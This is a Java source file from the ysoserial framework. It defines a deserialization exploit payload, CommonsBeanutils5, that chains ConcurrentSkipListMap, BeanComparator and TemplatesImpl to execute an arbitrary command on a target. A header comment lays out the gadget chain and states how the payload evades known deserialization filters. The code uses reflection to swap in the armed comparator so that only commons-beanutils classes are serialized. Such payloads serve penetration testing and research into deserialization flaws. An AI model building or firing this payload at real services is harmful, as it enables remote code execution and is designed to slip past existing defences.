package ysoserial.payloads;

import java.io.Serializable;
import java.util.concurrent.ConcurrentSkipListMap;

import org.apache.commons.beanutils.BeanComparator;
import org.apache.commons.collections4.comparators.TransformingComparator;
import org.apache.commons.collections4.functors.InvokerTransformer;

import ysoserial.payloads.annotation.Authors;
import ysoserial.payloads.annotation.Dependencies;
import ysoserial.payloads.util.Gadgets;
import ysoserial.payloads.util.PayloadRunner;
import ysoserial.payloads.util.Reflections;

/*
	CommonsBeanutils via ConcurrentSkipListMap — bypasses PriorityQueue AND TreeBag.
	NO commons-collections dependency on the target.

	Gadget chain:
		ObjectInputStream.readObject()
			ConcurrentSkipListMap.readObject()
				ConcurrentSkipListMap.put()
					BeanComparator.compare()
						PropertyUtils.getProperty(templates, "outputProperties")
							TemplatesImpl.getOutputProperties()
								TemplatesImpl.newTransformer()
									... -> RCE

	Filter evasion:
		1. ConcurrentSkipListMap — not in any known filter
		2. No PriorityQueue/TreeBag/TreeMap/TreeSet/HashMap/HashSet
		3. No commons-collections classes in serialized payload
		4. BeanComparator + PropertyUtils reflection (commons-beanutils only)

	Construction technique:
		CC4's TransformingComparator + InvokerTransformer("toString") used ONLY during
		construction to safely insert TemplatesImpl keys with unique ordering.
		Before serialization, ConcurrentSkipListMap.comparator is swapped to
		BeanComparator("outputProperties") via reflection.
		CC4 classes are NOT serialized — only BeanComparator appears in the payload.

	Requires:
		commons-beanutils 1.9.x
		No commons-collections needed on target!
 */
@SuppressWarnings({"rawtypes", "unchecked"})
@Dependencies({"commons-beanutils:commons-beanutils:1.9.2"})
@Authors({ Authors.DMBS335 })
public class CommonsBeanutils5 extends PayloadRunner implements ObjectPayload<Serializable> {

	public Serializable getObject(final String command) throws Exception {
		Object templates1 = Gadgets.createTemplatesImpl(command);
		Object templates2 = Gadgets.createTemplatesImpl(command);

		// Safe comparator for construction — CC4 classes used only at build time
		InvokerTransformer safeTransformer = new InvokerTransformer(
			"toString", new Class[0], new Object[0]);
		TransformingComparator safeComp = new TransformingComparator(safeTransformer);

		// ConcurrentSkipListMap with TemplatesImpl keys
		ConcurrentSkipListMap<Object, Object> map = new ConcurrentSkipListMap<>(safeComp);
		map.put(templates1, "a");  // first — no compare
		map.put(templates2, "b");  // second — compare via toString, unique per instance

		// Armed comparator — String.CASE_INSENSITIVE_ORDER avoids CC3 dependency
		BeanComparator beanComp = new BeanComparator(
			"outputProperties", String.CASE_INSENSITIVE_ORDER);

		// Swap comparator — only BeanComparator is serialized, no CC4 classes
		Reflections.setFieldValue(map, "comparator", beanComp);

		return map;
	}

	public static void main(final String[] args) throws Exception {
		PayloadRunner.run(CommonsBeanutils5.class, args);
	}
}
